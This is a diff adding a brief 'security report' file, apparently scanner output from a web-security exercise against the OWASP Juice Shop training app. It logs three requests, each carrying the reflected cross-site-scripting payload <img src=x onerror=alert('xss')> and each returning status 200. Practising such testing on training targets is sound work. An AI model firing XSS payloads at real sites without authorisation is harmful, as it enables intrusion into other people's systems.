@@ -1,0 +1,12 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=<img src=x onerror=alert('xss')>
+
+[STATUS]: 200
+[PAYLOAD]: <img src=x onerror=alert('xss')>
+---
+[STATUS]: 200
+[PAYLOAD]: <img src=x onerror=alert('xss')>
+---
+[STATUS]: 200
+[PAYLOAD]: <img src=x onerror=alert('xss')>
+---
